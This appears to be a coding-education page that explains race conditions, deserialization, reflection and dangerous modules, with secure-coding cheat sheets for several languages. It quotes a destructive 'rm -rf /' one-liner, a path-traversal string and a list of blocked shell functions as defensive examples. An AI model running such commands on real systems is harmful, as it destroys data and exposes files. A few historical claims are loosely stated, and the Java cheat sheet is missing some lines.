🔬 Spectre Used Timers: The Spectre CPU vulnerability used high-resolution timers to read protected memory! Browsers reduced timer precision from 5μs to 1ms because of this.
💰 HFT Nanoseconds: High-frequency traders pay millions for nanosecond advantages! Being 1 microsecond faster = billions in profits. Time literally is money.
🎯 setImmediate vs setTimeout(0): They're NOT the same! setImmediate runs after I/O, setTimeout after the minimum delay. Order matters!

Async Exploits

2/2 (100%)

🎯 What are Async Exploits?

In Simple Words: Async code is like ordering food at a busy restaurant. You order (start async task), wait (other code runs), get food (callback fires). Race conditions happen when two orders get mixed up - you get someone else's food (data)!

Real-World Example: Check user balance → User withdraws simultaneously → Both checks pass → Both withdrawals succeed → Bank loses money! Classic race condition.

💡 Async - Use For Good

⚡ High-Performance Servers
Node.js handles 1M+ concurrent connections with async I/O! Build servers that scale to millions of users without millions of threads.
🔄 Parallel Processing
Promise.all(), asyncio.gather() - run tasks in parallel! Process thousands of API calls, file operations, or database queries simultaneously.
📱 Responsive UIs
Never block the main thread! Async code keeps apps responsive while loading data. Build apps that feel instant.

🤯 Async Anomalies

🌀 Callback Hell Was Real: Before Promises, JavaScript had 10+ levels of nested callbacks! async/await was so game-changing it got added to Python, C#, Rust, and Swift.
⚛️ Atomics Save the Day: JavaScript's SharedArrayBuffer + Atomics enable safe multi-threaded programming! Lock-free data structures in the browser.
🐘 PostgreSQL ACID: Database transactions use locks to prevent race conditions. BEGIN, COMMIT, ROLLBACK - your bank account is safe because of these!

Dangerous Modules

🎯 What are Dangerous Modules?

In Simple Words: Modules are like power tools in a workshop. A hammer is safe, but a chainsaw needs training! Some modules (os, subprocess, eval) give full system access - perfectly safe for experts, dangerous for untrusted code.

Real-World Example: Python's pickle module can execute arbitrary code when loading data! A pickle file is not just data - it's a program in disguise.

💡 Powerful Modules - Use For Good

🤖 Automation Bots
os, subprocess, shutil - automate EVERYTHING! Backup scripts, deployment bots, system maintenance tools. The sysadmin's best friends.
🔧 Development Tools
Build your own linters, formatters, scaffolding tools! Read code, analyze it, transform it, write it back. Meta-programming magic.
📊 System Monitoring
psutil, os.statvfs, platform - build monitoring dashboards! Track CPU, memory, disk usage. Build your own htop or Activity Monitor.

🤯 Module Mysteries

🐍 Python's import is Turing-Complete: import statements can run arbitrary code! __import__("os").system("rm -rf /") is valid Python. Import is not safe.
📦 npm postinstall Scripts: Installing a package can run ANY code! This is how eslint-scope malware stole npm tokens in 2018.
🛡️ Deno's Permission Model: Deno requires --allow-read, --allow-net, etc. First runtime to make module permissions explicit. The future of secure imports!

🎯 What is Safe Code?

In Simple Words: Safe code is like a skilled chef who can make amazing meals using only the standard kitchen tools - no dangerous machinery needed! Pure calculations, data transformations, algorithms - the real craft of programming.

Real-World Example: Sorting a list, calculating fibonacci numbers, parsing JSON - these operations can't hack a system. They're the 99% of code that does useful work safely!

💚 Why Safe Code is Actually Exciting

🧮 Algorithms Power Everything
Google's PageRank, Spotify's recommendations, Netflix's streaming optimization - all "just" algorithms! Master data structures and algorithms to build world-changing products.
🎯 Pure Functions = Superpowers
Functions without side effects are predictable, testable, parallelizable. React, Redux, functional programming - all about harnessing pure functions for maintainable, scalable code.
⚡ Performance Optimization
The difference between O(n²) and O(n log n) can mean seconds vs hours! Safe code patterns like memoization, lazy evaluation, and caching are the secret weapons of high-performance systems.

🤯 Safe Code Superpowers

🧬 Functional Programming Rises: Languages like Rust, Elm, and Haskell make dangerous operations impossible by design! The future of secure code is here.
🔒 Capability-Based Security: Instead of "can this code run?", ask "what can this code access?" Deno, CloudFlare Workers use this model - safe by default!
🎭 WebAssembly Sandboxing: Run any language in the browser safely! WASM has no access to DOM, network, or filesystem unless explicitly granted.

Deserialization

3/3 (100%)

🎯 What is Deserialization?

In Simple Words: Imagine receiving a flat-pack furniture box (serialized data). Deserialization is assembling it. But what if the instructions secretly say "and then unlock the front door"? You followed the instructions and now your house is compromised!

Real-World Example: Java applications receive user data as serialized objects. Attacker sends a crafted object that, when "unpacked," executes malicious code. This caused the Equifax breach affecting 147 million people!

💡 Serialization - Use For Good

💾 State Persistence
Save game states, user sessions, application settings - serialization lets you freeze and restore program state! Build apps that remember exactly where users left off.
🔄 Distributed Systems
Microservices communicate via serialized data! Protocol Buffers (Google), Avro (Apache), MessagePack - fast, type-safe serialization for inter-service communication.
📨 Message Queues
Kafka, RabbitMQ, SQS - all serialize messages for async processing! Build systems that handle millions of events per second.

🤯 Serialization Shockers

💥 Log4Shell (2021): The worst vulnerability in decades - a simple log message could execute arbitrary code! Affected millions of Java applications worldwide.
🎯 PHP Object Injection: WordPress, Drupal, Joomla have all had object injection bugs. Unserialize() is so dangerous it should probably be removed from PHP!
🛡️ The Fix is Simple: Use JSON, not native serialization! JSON can only represent data, not code. Yet developers keep using dangerous formats.

Introspection

8/8 (100%)

🎯 What is Introspection?

In Simple Words: Introspection is code looking at itself in a mirror. It can see its own organs, understand its structure, even modify itself! Like a robot that can open itself up and rewire its own circuits.

Real-World Example: Python's dir() shows all attributes of any object. An attacker can discover hidden functions, private variables, and find ways to exploit them.

💡 Introspection - Use For Good

🔍 IDE Autocomplete
VS Code's IntelliSense, PyCharm's autocomplete - all use introspection! Build developer tools that understand code at runtime.
🧪 Testing Frameworks
pytest auto-discovers test functions, unittest finds test classes - introspection magic! Build smart test runners that adapt to your code structure.
📄 API Documentation
Swagger, Sphinx, Javadoc - auto-generate docs from code! Introspection extracts docstrings, type hints, and signatures automatically.

🤯 Introspection Mind-Blowers

🐍 Python's Everything is Public: Python has no real private members - _name is just a convention! __name uses name mangling but can still be accessed.
☕ Java Reflection Breaks Encapsulation: setAccessible(true) can access ANY private field! The JVM's security is based on trust, not enforcement.
🦀 Rust Limits Reflection: Rust intentionally has minimal reflection to prevent entire classes of bugs. Compile-time safety over runtime flexibility!

Reflection

12/12 (100%)

🎯 What is Reflection?

In Simple Words: Reflection is calling someone you've never met using just their phone number. You can call any function if you know its name - even private ones! It's like having a master key to every lock in the building.

Real-World Example: Java's Class.forName(userInput).newInstance() - user controls which class gets loaded! Attackers inject classes that execute shell commands.

💡 Reflection - Use For Good

🔌 Plugin Systems
VS Code extensions, Minecraft mods, Webpack plugins - all use reflection to load code dynamically! Build extensible applications that users can customize.
🎯 Dependency Injection
Spring, Angular, NestJS - inject dependencies at runtime using reflection! Build loosely-coupled, testable applications.
📦 ORM Mapping
Hibernate, SQLAlchemy, TypeORM - map database rows to objects automatically! Reflection inspects classes to generate SQL queries.

🤯 Reflection Revelations

⚡ Java Serialization Uses Reflection: When you deserialize an object, Java uses reflection to call constructors and set fields. This is why deserialization is dangerous!
🔧 Spring is 90% Reflection: The entire Spring Framework is built on reflection. @Autowired, @Controller, @Service - all discovered and wired via reflection!
🏎️ MethodHandles are Faster: Java 7+ introduced MethodHandles as a faster alternative to reflection. 10x faster method invocation!

JAVASCRIPT - Use For Good

💡 Use These Powers For Good

🔧 Build CLI Tools with child_process
Instead of malicious use, child_process can automate your development workflow! Build your own CLI tools: automated git operations, file processors, deployment scripts. Pro tip: Use execSync for simple commands, spawn for streaming large outputs.
🌐 Create Powerful Dev Servers
The same http and net modules hackers exploit can build amazing dev tools! Create mock APIs, proxy servers, WebSocket servers for real-time apps. Did you know? You can build a full HTTP server in just 5 lines of Node.js code.
⚡ Master eval() Safely
While eval() is dangerous with user input, it powers amazing tools! Build expression parsers, formula calculators, or dynamic code playgrounds (like this app!). Safe pattern: Always sanitize and never eval user input directly.

🤯 Mind-Blowing JavaScript Facts

⚡ V8 Engine Magic: JavaScript can be as fast as C++ when JIT-compiled properly. The same language that runs in browsers can now compete with compiled languages!
🌍 Prototype Power: The prototype chain you see blocked here is how every JS object inherits methods. Understanding it deeply lets you create elegant, memory-efficient code patterns!
🔮 Proxy & Reflect: These "dangerous" APIs let you build reactive frameworks like Vue.js! They intercept ALL object operations - reads, writes, function calls, everything!

🛡️ JavaScript Security Cheat Sheet

❌ eval(userInput)
✅ JSON.parse(userInput)
Parse data safely without code execution
❌ innerHTML = userInput
✅ textContent = userInput
Prevents XSS attacks in DOM manipulation
❌ new Function(userCode)
✅ Use a sandboxed iframe or Web Worker
Isolate dynamic code execution
❌ document.cookie accessible
✅ Set HttpOnly and Secure flags
Protect cookies from JS theft
❌ window.location = userUrl
✅ Validate URL with new URL() + allowlist
Prevent open redirect attacks
❌ Object.assign(target, userObj)
✅ Pick specific properties only
Block prototype pollution via __proto__

🔥 Pro Security Tips

  • Object.freeze() makes objects immutable - great for config!
  • 'use strict' catches silent errors and prevents bad patterns
  • Use crypto.randomUUID() not Math.random() for tokens
  • CSP headers are your best friend against XSS
  • Intl.Segmenter handles Unicode safely - no regex for user text!
🔷

TYPESCRIPT - Use For Good

💡 TypeScript Superpowers

🛡️ Type Guards as Security
TypeScript's type system can prevent entire classes of bugs at compile time! Create strict types for user input, API responses, and data validation. Pro tip: Use discriminated unions and never to make invalid states unrepresentable.
🏗️ Build Your Own DSL
TypeScript's advanced types let you create domain-specific languages that catch errors at compile time! Build type-safe SQL query builders, API clients, or configuration systems.
📦 Safer npm Packages
Publish npm packages with .d.ts files and consumers get autocomplete + type checking. Did you know? You can use TypeScript to analyze JavaScript files without converting them!

🤯 TypeScript Tricks

🧠 Turing Complete Types: TypeScript's type system is so powerful, you can implement a JSON parser or even simple games entirely within the type system!
🎭 Type Branding: You can create "branded" types that are impossible to mix up. type USD = number & { __brand: 'USD' } - Now you can't accidentally add USD to EUR!

🛡️ TypeScript Security Cheat Sheet

❌ any type everywhere
✅ unknown + type guards
Forces explicit validation of external data
❌ as Type (type assertion)
✅ Type predicates: is Type
Runtime validation, not just compile-time lies
❌ object as Record<string, any>
✅ Zod/io-ts for runtime validation
Schema validation at API boundaries
❌ String enums for user input
✅ const assertions + Set.has()
Type-safe input validation
❌ Return Promise<any>
✅ Return Promise<Result<T, Error>>
Force error handling at compile time
❌ Mutable shared state
✅ Readonly<T> and readonly arrays
Immutability prevents side effects

🔥 TypeScript Security Patterns

  • satisfies operator validates without widening types
  • Template literal types can validate string formats at compile time
  • NoInfer<T> prevents type inference attacks in generics
  • Use strictNullChecks - it catches SO many bugs
  • Branded types for IDs: type UserId = string & { readonly __brand: unique symbol }
🐍

PYTHON - Use For Good

💡 Python Powers For Good

🤖 Automation Master
The same os and subprocess modules hackers exploit can automate your entire workflow! Build backup scripts, file organizers, system monitors, deployment pipelines. Pro tip: Use pathlib instead of os.path for cleaner code.
🕷️ Web Scraping for Research
urllib and requests can ethically gather data for research, price monitoring, or building datasets. Respect robots.txt, add delays, and always check terms of service!
🔬 Dynamic Magic Methods
Python's __getattr__, __setattr__ can build amazing abstractions! Create lazy-loading objects, automatic API wrappers, or debugging proxies. Example: Django ORM uses these to make database queries feel like Python objects.

🤯 Python Secrets

🐍 Everything is an Object: Even functions, classes, and modules are objects in Python. You can add attributes to functions: my_func.metadata = "value"!
⚡ Comprehension Performance: List comprehensions aren't just prettier - they're faster! They're optimized at the bytecode level and avoid function call overhead.
🎪 Metaclasses: Classes are instances of metaclasses. You can customize how classes themselves work! Django, SQLAlchemy, and many frameworks use this to create intuitive APIs.

🛡️ Python Security Cheat Sheet

❌ eval(user_input)
✅ ast.literal_eval(user_input)
Only parses literals, no code execution
❌ pickle.loads(untrusted_data)
✅ json.loads() or msgpack
Pickle can execute arbitrary code!
❌ os.system(f"cmd {user}")
✅ subprocess.run([cmd, user], shell=False)
Array args prevent shell injection
❌ yaml.load(data)
✅ yaml.safe_load(data)
YAML can execute Python objects!
❌ open(user_path).read()
✅ Validate path with pathlib.resolve()
Prevent path traversal ../../../etc/passwd
❌ SQL f-strings: f"WHERE id={id}"
✅ Parameterized: cursor.execute(sql, (id,))
Prevents SQL injection attacks

🔥 Python Security Secrets

  • secrets module for crypto-safe random tokens, not random
  • hashlib.scrypt() for password hashing with salt
  • defusedxml library prevents XXE attacks in XML parsing
  • Use bandit to scan your code for security issues
  • __slots__ prevents dynamic attribute injection attacks
  • Virtual environments isolate dependencies - use them!
🐘

PHP - Use For Good

💡 PHP Modern Superpowers

🚀 PHP 8+ Revolution
Modern PHP is nothing like PHP 4! With JIT compilation, PHP 8 can be 3x faster. Named arguments, attributes, match expressions - it's a completely different language now!
🌐 WebSocket Servers in PHP!
Holy shit moment: PHP wasn't designed for long-running processes, but tools like ReactPHP and Swoole let you build async WebSocket servers that rival Node.js! You can handle 100,000+ concurrent connections from PHP.
🔐 Security Best Practices
Always use password_hash() (never MD5!), parameterized queries with PDO, and htmlspecialchars() for output. These simple habits prevent 90% of PHP vulnerabilities!

🤯 PHP Myths Busted

💨 PHP Powers 78% of the Web: WordPress, Wikipedia, Facebook (originally), Slack's backend - all PHP! The language you love to hate runs most of the internet.
🔥 Swoole vs Node.js: In benchmarks, PHP with Swoole extension outperforms Node.js in many HTTP scenarios. Yes, really! The async PHP revolution is real.
🧬 Traits + Anonymous Classes: PHP can do things that feel impossible! Create classes on the fly, compose behaviors with traits, build framework-level magic.

🛡️ PHP Security Cheat Sheet

❌ md5($password)
✅ password_hash($password, PASSWORD_DEFAULT)
Bcrypt with salt, auto-upgrades algorithm
❌ mysql_query("SELECT * WHERE id=$id")
✅ PDO prepared statements
mysql_* is deprecated AND vulnerable
❌ echo $userInput
✅ echo htmlspecialchars($input, ENT_QUOTES)
Prevents XSS in HTML context
❌ include($_GET['page'].'.php')
✅ Allowlist: in_array($page, $allowed)
LFI/RFI is a top PHP vulnerability
❌ unserialize($userInput)
✅ json_decode($userInput)
PHP Object Injection is devastating
❌ header("Location: $url")
✅ Validate with filter_var($url, FILTER_VALIDATE_URL)
Open redirect prevention

🔥 PHP Security Arsenal

  • disable_functions in php.ini: exec, system, shell_exec, passthru
  • open_basedir restricts file access to specific directories
  • random_bytes() for crypto-safe random data
  • Use sodium_* functions for modern encryption
  • Set session.cookie_httponly = 1 to protect sessions
  • Composer audit command checks for vulnerable dependencies

💡 Java Hidden Powers

🪞 Reflection for Testing
The same reflection hackers use for evil powers amazing testing frameworks! JUnit, Mockito, and Spring all use reflection extensively. Pro tip: Use setAccessible(true) to test private methods (but only in tests!).
🎯 Annotation Processors
Java annotations + reflection = magic! Build your own @Cached, @Retry, or @Benchmark annotations. Lombok generates code at compile time using these techniques!
📡 Build Your Own RPC
Serialization (when used safely!) enables distributed computing. gRPC, Apache Kafka, Hazelcast - all use serialization to send objects across networks. Safe practice: Use allowlists and never deserialize untrusted data.

🤯 Java Secrets

☕ JVM Languages: The JVM runs Kotlin, Scala, Groovy, Clojure, and more! Learn one runtime, use many languages. Android (Kotlin), Spark (Scala), Gradle (Groovy).
🚀 GraalVM Native Image: Compile Java to native executables that start in milliseconds! No JVM warmup, tiny memory footprint - perfect for serverless and CLI tools.
🔮 Project Loom: Virtual threads are coming! Handle millions of concurrent tasks with code as simple as sequential programming. Java's async revolution.

🛡️ Java Security Cheat Sheet

❌ new ObjectInputStream(untrusted)

❌ Runtime.exec(userInput)

Prevents shell injection attacks
❌ SQL: "SELECT * WHERE id=" + id
✅ PreparedStatement with parameters
SQL injection still happens in 2025
❌ new File(userPath)
✅ Paths.get(base).resolve(user).normalize()
Path traversal prevention
❌ DocumentBuilder.parse(untrusted)
✅ Disable external entities (XXE)
XXE can read files, make requests
❌ Class.forName(userInput)
✅ Allowlist of permitted classes
Reflection can bypass security

🔥 Java Security Arsenal

  • Use SecurityManager (deprecated but still works) or custom ClassLoader
  • java.security.SecureRandom for crypto, not java.util.Random
  • OWASP Dependency Check scans for vulnerable libraries
  • sealed classes (Java 17+) prevent unauthorized inheritance
  • record classes are immutable by default - use them!
  • JEP 411: Security Manager deprecation - use containers instead
🟦

CSHARP - Use For Good

💡 C# / .NET Hidden Powers

⚡ Source Generators
Roslyn source generators inspect your code at compile time and add new code - zero runtime cost! System.Text.Json, ASP.NET Core minimal APIs, and MediatR all use them for blazing performance.
🪞 Reflection + Attributes
C# attributes + reflection power Entity Framework, ASP.NET model binding, xUnit, and dependency injection. Build your own [Cached] or [Retry] aspect with a few lines of reflection.
🚀 Span<T> & Memory<T>
The same unsafe memory tools attackers abuse also let you write zero-allocation parsers and serializers. Span<byte> + stackalloc = blazing-fast safe code when bounds are verified.

🤯 .NET Secrets

🌐 One Runtime, Every OS: .NET runs natively on Windows, Linux, macOS, ARM, and even iOS/Android via .NET MAUI. Same C# code, every platform.
🪄 Native AOT: Compile C# to a single native binary that boots in milliseconds with no JIT - perfect for serverless, CLIs, and tiny containers.
🧬 F# & Other .NET Languages: The CLR runs C#, F#, VB.NET, IronPython, and more - interop is effortless, so you can sprinkle F# into a C# codebase for type-safe domain logic.

🛡️ C# Security Cheat Sheet

❌ BinaryFormatter.Deserialize(stream)
✅ System.Text.Json or MessagePack
BinaryFormatter is officially deprecated as dangerous
❌ Process.Start(userInput)
✅ ProcessStartInfo with Arguments array, UseShellExecute=false
Prevents shell argument injection
❌ SqlCommand("SELECT * WHERE id=" + id)
✅ Parameters.AddWithValue("@id", id)
SQL injection is still everywhere
❌ TypeNameHandling.All in Json.NET
✅ TypeNameHandling.None + custom converters
$type RCE gadget chains (CVE-2019-18935 et al.)
❌ unsafe { byte* p = ... }
✅ Span<byte> with checked bounds
Stack smashing & arbitrary memory writes
❌ [DllImport("kernel32.dll")] LoadLibrary
✅ Stay in managed code; sign & verify any native deps
P/Invoke side-loads attacker DLLs

🔥 .NET Security Arsenal

  • System.Security.Cryptography.RandomNumberGenerator for crypto, never Random
  • nullable reference types catch null bugs at compile time
  • record and readonly struct for immutable-by-default models
  • NuGet: run dotnet list package --vulnerable regularly
  • Avoid BinaryFormatter, SoapFormatter, NetDataContractSerializer - Microsoft has marked them dangerous
  • Sandbox untrusted code in containers / WASM, not AppDomains (which are .NET Framework only)

🎯 Why Learn About Security Vulnerabilities?

Understanding how attacks work makes you a better developer. The same techniques hackers use to break systems can be channeled into building powerful, legitimate tools. This knowledge helps you write more secure code, build better architectures, and create amazing developer tools.

🔧 DevOps & Automation

The child_process and subprocess modules that enable RCE attacks also power every CI/CD pipeline in existence! GitHub Actions, Jenkins, Docker - they all execute commands.

🌐 Real-Time Applications

Network sockets that attackers use for backdoors power amazing real-time apps! WebSockets, game servers, chat applications, live dashboards.

✨ Build This:

A collaborative whiteboard or multiplayer game using WebSockets - same technology, creative purpose!

📊 Data Processing

File system access enables both data theft AND powerful ETL pipelines! Process logs, transform data, generate reports, analyze codebases.

✨ Build This:

A log analyzer that parses nginx logs and generates beautiful usage dashboards.

🧪 Testing Frameworks

Reflection and introspection - the tools of deserialization attacks - power every testing framework! JUnit, Jest, pytest all inspect and manipulate code dynamically.

Your own test runner that auto-discovers tests, mocks dependencies, and generates coverage reports.

🎓 Educational Platforms

Code execution (sandboxed!) enables platforms like this one, LeetCode, Replit, CodePen. Millions learn to code through safe code execution environments.

🤖 AI & ML Pipelines

Dynamic code generation powers no-code tools, AI assistants, and ML pipelines. GitHub Copilot suggestions, Jupyter notebooks, data science workflows.

🤯 Mind-Blowing Cross-Language Facts

🌐 Every Language Can Be a Server

PHP Socket Servers: Despite PHP being "not designed" for long-running processes, Swoole and ReactPHP let you build WebSocket servers handling 100k+ connections!

Java in the Browser: GraalJS lets you run JavaScript inside Java, and TeaVM compiles Java to WebAssembly!

Python for Everything: From AI (PyTorch) to desktop apps (PyQt) to mobile (Kivy) - one language, infinite possibilities.

⚡ Performance Surprises

JavaScript vs C++: Modern V8 JIT compilation can make JS code as fast as C++ in many scenarios!

PHP 8 Revolution: JIT compilation made PHP 3x faster for computation-heavy tasks. It's not the slow language you remember!

Python Numba: Add @jit decorator and your Python code compiles to machine code, running 100x faster!

🔄 Languages Learning From Each Other

Async/Await: Started in C#, now in JavaScript, Python, Rust, Swift - everyone adopted it!

Type Systems: TypeScript inspired Python's type hints, and Flow. Static typing is spreading!

Pattern Matching: From ML/Haskell to Python 3.10's match, Java's switch expressions, and JavaScript's TC39 proposals.

🛡️ Security Best Practices Cheat Sheet

🔐 Input Validation

Never trust user input. Validate on both client AND server. Use allowlists over blocklists. Sanitize for the context (HTML, SQL, shell).

const sanitized = input.replace(/[^a-zA-Z0-9]/g, '');

🔒 Least Privilege

Give code only the permissions it needs. Run containers as non-root. Use separate database users for read vs write operations.

DROP USER IF EXISTS readonly; CREATE USER readonly WITH PASSWORD 'xxx';

📝 Secure Defaults

Don't rely on users to configure security. Make the default secure. Disable dangerous functions, require authentication, encrypt by default.

disable_functions = exec, system, shell_exec

🔍 Defense in Depth

Multiple layers of security! Firewall + WAF + input validation + parameterized queries + encryption + monitoring. If one fails, others protect you.
